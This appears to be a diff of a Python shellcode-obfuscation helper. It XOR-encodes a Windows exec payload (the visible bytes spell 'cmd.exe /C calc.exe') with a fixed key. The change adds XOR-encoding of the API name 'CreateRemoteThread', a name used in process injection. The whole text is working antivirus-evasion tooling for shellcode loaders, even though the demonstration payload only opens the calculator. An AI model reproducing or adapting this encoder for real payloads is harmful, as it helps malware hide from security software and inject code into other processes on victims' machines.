@@ -30,20 +30,21 @@ buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
 buf += b"\xda\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f"
 buf += b"\x43\x20\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
 
+buf = b"CreateRemoteThread"
 key = b"shellcodefacile"
 xored_string = list()
 
 buf_length = len(buf)
 key_length = len(key)
 
-print(" Code size: {}".format(buf_length))
-print(" Key size: {}".format(key_length))
+print("key: {" +",".join(["0x{:02x}".format(key[i]) for i in range(key_length)])+"}, size: "+ str(key_length))
+print("data: {" +",".join(["0x{:02x}".format(buf[i]) for i in range(buf_length)])+"}, size: "+ str(buf_length))
 
 for i in range(buf_length):
     k = key[i % key_length]
     xored_string.append("0x{:02x}".format(buf[i] ^ k))
 
-print("{"+",".join(xored_string)+"}")
+print("xored: {"+",".join(xored_string)+"}")
 
-with open("calc.xor", "wb") as f:
-    f.write(bytes("\\"+"\\".join(xored_string), "utf-8"))
+# with open("calc.xor", "wb") as f:
+#     f.write(bytes("\\"+"\\".join(xored_string), "utf-8"))
